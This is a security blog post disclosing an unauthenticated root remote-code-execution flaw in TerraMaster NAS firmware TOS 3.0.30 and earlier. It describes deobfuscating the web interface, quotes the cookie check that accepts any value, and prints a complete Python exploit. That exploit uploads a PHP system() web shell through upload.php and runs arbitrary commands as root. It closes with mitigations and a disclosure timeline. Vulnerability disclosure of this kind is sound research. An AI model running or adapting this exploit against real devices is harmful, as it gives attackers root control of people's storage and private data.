{
  "Source": "www.evilsocket.net",
  "Title": "TerraMaster NAS TOS \u003c= 3.0.30 Unauthenticated RCE as Root",
  "Link": "https://www.evilsocket.net/2017/05/30/Terramaster-NAS-Unauthenticated-RCE-as-root/",
  "Content": "\u003cdiv class=\"content\" itemprop=\"articleBody\"\u003e\n\u003cp\u003eRecently I bought a TerraMaster F2-420 NAS from Amazon in order to store my private code, backups and this kind of stuff. As soon as it arrived I started to play with its web interface and eventually I wanted to see how it was implemented, moreover I was curious to see if I could find any remotely exploitable vulnerability.\u003c/p\u003e\n\u003cp\u003eAs you can see … I succeeded :)\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/images/2017/05/exploit.png\" alt=\"nas\"/\u003e\u003c/p\u003e\n\u003cspan id=\"more\"\u003e\u003c/span\u003e\n\u003cp\u003eOnce connected to the NAS through SSH, I realized the whole interface was a PHP application stored on \u003ccode\u003e/usr/www/\u003c/code\u003e, but unfortunately the source code was obfuscated:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/images/2017/05/obfuscated.png\" alt=\"obfuscated\"/\u003e\u003c/p\u003e\n\u003cp\u003ePrinting PHP compilation options and modules revealed what kind of obfuscation was going on, \u003ccode\u003ephp_screw\u003c/code\u003e:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/images/2017/05/configure.png\" alt=\"configure\"/\u003e\u003c/p\u003e\n\u003cp\u003eLucky me, there’s the \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/dehydr8/php_unscrew\"\u003ephp_unscrew\u003c/a\u003e tool written by Osama Khalid, I only had to follow the instructions on the repository in order to extract the key and header length from the encrypted files on the NAS, which happened to be \u003ccode\u003ed311ea00d301b80c3f00\u003c/code\u003e and \u003ccode\u003e13\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/images/2017/05/bingo.png\" alt=\"bingo\"/\u003e\u003c/p\u003e\n\u003cp\u003eAt this stage, I could read any PHP file running on the NAS, until I found what I’ve been looking for, \u003ccode\u003e/usr/www/include/upload.php\u003c/code\u003e which, as you guessed, handles file uploads to the NAS … and here’s all the authentication involved:\u003c/p\u003e\n\u003cfigure class=\"highlight php\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e3\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e4\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e5\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e6\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e7\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e8\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e9\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e10\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e11\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e12\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e13\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e14\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"meta\"\u003e\u0026lt;?php\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e...\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e...\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e...\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"variable\"\u003e$targetDir\u003c/span\u003e = \u003cspan class=\"variable\"\u003e$_REQUEST\u003c/span\u003e[\u003cspan class=\"string\"\u003e\u0026#39;targetDir\u0026#39;\u003c/span\u003e];\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"variable\"\u003e$file_path\u003c/span\u003e = @realpath(\u003cspan class=\"variable\"\u003e$targetDir\u003c/span\u003e);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"keyword\"\u003eif\u003c/span\u003e(strstr(\u003cspan class=\"variable\"\u003e$file_path\u003c/span\u003e, \u003cspan class=\"string\"\u003e\u0026#34;/mnt/base/update\u0026#34;\u003c/span\u003e) === \u003cspan class=\"literal\"\u003efalse\u003c/span\u003e){\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\t\u003cspan class=\"keyword\"\u003eif\u003c/span\u003e(!\u003cspan class=\"variable\"\u003e$_COOKIE\u003c/span\u003e[\u003cspan class=\"string\"\u003e\u0026#39;kod_name\u0026#39;\u003c/span\u003e]){\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\t\t\u003cspan class=\"keyword\"\u003edie\u003c/span\u003e(\u003cspan class=\"string\"\u003e\u0026#39;{\u0026#34;jsonrpc\u0026#34; : \u0026#34;2.0\u0026#34;, \u0026#34;error\u0026#34; : {\u0026#34;code\u0026#34;: 104, \u0026#34;message\u0026#34;: \u0026#34;You are not login!\u0026#34;}, \u0026#34;id\u0026#34; : \u0026#34;id\u0026#34;}\u0026#39;\u003c/span\u003e);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\t}\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e}\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e...\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e...\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e...\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\u003cp\u003eTL;DR; As long as you set the \u003ccode\u003ekod_name\u003c/code\u003e cookie to \u003cstrong\u003eany\u003c/strong\u003e value, the system considers you as authenticated and lets you \u003cstrong\u003eupload any file to any location on the file system\u003c/strong\u003e … oh, did I mention that the web server \u003cstrong\u003eis running as root\u003c/strong\u003e? \u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/images/2015/Jan/major-facepalm.jpg\" alt=\"facepalm\"/\u003e\u003c/p\u003e\n\u003cp\u003eI contacted the vendor on May 11 and initially they seemed to care assuring me an update would have been released in a couple of days … 19 days ellapsed, still no fixes and they’re ignoring my emails now, so I decided to go full disclosure.\u003c/p\u003e\n\u003ch3 id=\"Exploit\"\u003e\u003ca href=\"#Exploit\" class=\"headerlink\" title=\"Exploit\"\u003e\u003c/a\u003eExploit\u003c/h3\u003e\u003cfigure class=\"highlight python\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e3\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e4\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e5\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e6\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e7\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e8\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e9\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e10\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e11\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e12\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e13\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e14\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e15\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e16\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e17\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e18\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e19\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e20\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e21\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e22\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e23\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e24\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e25\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e26\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e27\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e28\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e29\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e30\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e31\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e32\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e33\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e34\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e35\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e36\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e37\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e38\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e39\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e40\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e41\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e42\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e43\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e44\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e45\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e46\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e47\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e48\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e49\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e50\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e51\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e52\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e#!/usr/bin/python\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# coding: utf8\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e#\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# Exploit: Unauthenticated RCE as root.\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# Vendor: TerraMaster\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# Product: TOS \u0026lt;= 3.0.30 (running on every NAS)\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# Author: Simone \u0026#39;evilsocket\u0026#39; Margaritelli \u0026lt;\u003ca href=\"/cdn-cgi/l/email-protection\" class=\"__cf_email__\" data-cfemail=\"6b0e1d0207180408000e1f2b1b19041f0405060a020745080406\"\u003e[email protected]\u003c/a\u003e\u0026gt; \u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"keyword\"\u003eimport\u003c/span\u003e sys\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"keyword\"\u003eimport\u003c/span\u003e requests\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"function\"\u003e\u003cspan class=\"keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"title\"\u003eupload\u003c/span\u003e(\u003cspan class=\"params\"\u003e address, port, filename, path = \u003cspan class=\"string\"\u003e\u0026#39;/usr/www/\u0026#39;\u003c/span\u003e \u003c/span\u003e):\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    url = \u003cspan class=\"string\"\u003e\u0026#34;http://%s:%d/include/upload.php?targetDir=%s\u0026#34;\u003c/span\u003e % ( address, port, path )\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"keyword\"\u003etry\u003c/span\u003e:\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        files = { \u003cspan class=\"string\"\u003e\u0026#39;file\u0026#39;\u003c/span\u003e: \u003cspan class=\"built_in\"\u003eopen\u003c/span\u003e( filename, \u003cspan class=\"string\"\u003e\u0026#39;rb\u0026#39;\u003c/span\u003e ) }\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        cookies = { \u003cspan class=\"string\"\u003e\u0026#39;kod_name\u0026#39;\u003c/span\u003e: \u003cspan class=\"string\"\u003e\u0026#39;1\u0026#39;\u003c/span\u003e } \u003cspan class=\"comment\"\u003e# LOL :D\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        r = requests.post(url, files=files, cookies=cookies)\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003eif\u003c/span\u003e r.text != \u003cspan class=\"string\"\u003e\u0026#39;{\u0026#34;jsonrpc\u0026#34; : \u0026#34;2.0\u0026#34;, \u0026#34;result\u0026#34; : null, \u0026#34;id\u0026#34; : \u0026#34;id\u0026#34;}\u0026#39;\u003c/span\u003e:\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e            \u003cspan class=\"built_in\"\u003eprint\u003c/span\u003e \u003cspan class=\"string\"\u003e\u0026#34;! Unexpected response, exploit might not work:\\n%s\\n\u0026#34;\u003c/span\u003e % r.text\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"literal\"\u003eTrue\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"keyword\"\u003eexcept\u003c/span\u003e Exception \u003cspan class=\"keyword\"\u003eas\u003c/span\u003e e:\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"built_in\"\u003eprint\u003c/span\u003e \u003cspan class=\"string\"\u003e\u0026#34;\\n! ERROR: %s\u0026#34;\u003c/span\u003e % e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"literal\"\u003eFalse\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"function\"\u003e\u003cspan class=\"keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"title\"\u003erce\u003c/span\u003e(\u003cspan class=\"params\"\u003e address, port, command \u003c/span\u003e):\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"keyword\"\u003ewith\u003c/span\u003e \u003cspan class=\"built_in\"\u003eopen\u003c/span\u003e( \u003cspan class=\"string\"\u003e\u0026#39;/tmp/p.php\u0026#39;\u003c/span\u003e, \u003cspan class=\"string\"\u003e\u0026#39;w+t\u0026#39;\u003c/span\u003e ) \u003cspan class=\"keyword\"\u003eas\u003c/span\u003e fp:\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        fp.write( \u003cspan class=\"string\"\u003e\u0026#34;\u0026lt;?php system(\u0026#39;%s\u0026#39;); ?\u0026gt;\u0026#34;\u003c/span\u003e % command )\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"keyword\"\u003eif\u003c/span\u003e upload( address, port, \u003cspan class=\"string\"\u003e\u0026#39;/tmp/p.php\u0026#39;\u003c/span\u003e ) == \u003cspan class=\"literal\"\u003eTrue\u003c/span\u003e:\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003etry\u003c/span\u003e:\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e            url = \u003cspan class=\"string\"\u003e\u0026#34;http://%s:%d/p.php\u0026#34;\u003c/span\u003e % ( address, port )\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e            \u003cspan class=\"keyword\"\u003ereturn\u003c/span\u003e requests.get(url).text\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003eexcept\u003c/span\u003e Exception \u003cspan class=\"keyword\"\u003eas\u003c/span\u003e e:\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e            \u003cspan class=\"built_in\"\u003eprint\u003c/span\u003e \u003cspan class=\"string\"\u003e\u0026#34;\\n! ERROR: %s\u0026#34;\u003c/span\u003e % e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"literal\"\u003eNone\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"built_in\"\u003elen\u003c/span\u003e(sys.argv) \u0026lt; \u003cspan class=\"number\"\u003e3\u003c/span\u003e:\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"built_in\"\u003eprint\u003c/span\u003e \u003cspan class=\"string\"\u003e\u0026#34;Usage: exploit.py \u0026lt;ip|hostname\u0026gt; \u0026lt;command\u0026gt; (port=8181)\\n\u0026#34;\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    quit()\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003etarget  = sys.argv[\u003cspan class=\"number\"\u003e1\u003c/span\u003e]\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003ecommand = sys.argv[\u003cspan class=\"number\"\u003e2\u003c/span\u003e]\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eport    = \u003cspan class=\"number\"\u003e8181\u003c/span\u003e \u003cspan class=\"keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"built_in\"\u003elen\u003c/span\u003e(sys.argv) \u0026lt; \u003cspan class=\"number\"\u003e4\u003c/span\u003e \u003cspan class=\"keyword\"\u003eelse\u003c/span\u003e \u003cspan class=\"built_in\"\u003eint\u003c/span\u003e(sys.argv[\u003cspan class=\"number\"\u003e3\u003c/span\u003e])\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eout = rce( target, port, command )\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"keyword\"\u003eif\u003c/span\u003e out \u003cspan class=\"keyword\"\u003eis\u003c/span\u003e \u003cspan class=\"keyword\"\u003enot\u003c/span\u003e \u003cspan class=\"literal\"\u003eNone\u003c/span\u003e:\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"built_in\"\u003eprint\u003c/span\u003e out.strip()\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\u003ch3 id=\"Mitigations\"\u003e\u003ca href=\"#Mitigations\" class=\"headerlink\" title=\"Mitigations\"\u003e\u003c/a\u003eMitigations\u003c/h3\u003e\u003cul\u003e\n\u003cli\u003eUse a firewall to disable access to port \u003ccode\u003e8181\u003c/code\u003e of the NAS from untrusted users.\u003c/li\u003e\n\u003cli\u003eIf possible (NAS only used via SMB/NFS/SSH) completely delete the web ui.\u003c/li\u003e\n\u003cli\u003eHope for the vendor to quickly release a fix.\u003c/li\u003e\n\u003cli\u003eAlternatively, \u003cstrong\u003ebuy another and more secure NAS\u003c/strong\u003e :)\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"Timeline\"\u003e\u003ca href=\"#Timeline\" class=\"headerlink\" title=\"Timeline\"\u003e\u003c/a\u003eTimeline\u003c/h3\u003e\u003cul\u003e\n\u003cli\u003e11 May 2017: Initial report to TerraMaster.\u003c/li\u003e\n\u003cli\u003e12 May 2017: TM acknowledged the issue and promised a fix within \u003cem\u003ea couple of days\u003c/em\u003e.\u003c/li\u003e\n\u003cli\u003e16 May 2017: Follow up, still no fix.\u003c/li\u003e\n\u003cli\u003e25 May 2017: Follow up, still no fix.\u003c/li\u003e\n\u003cli\u003e29 May 2017: Follow up, still no fix and no answers neither.\u003c/li\u003e\n\u003cli\u003e30 May 2017: Disclosure.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e",
  "Date": "2017-05-30T11:15:28Z",
  "Author": "Simone Margaritelli"
}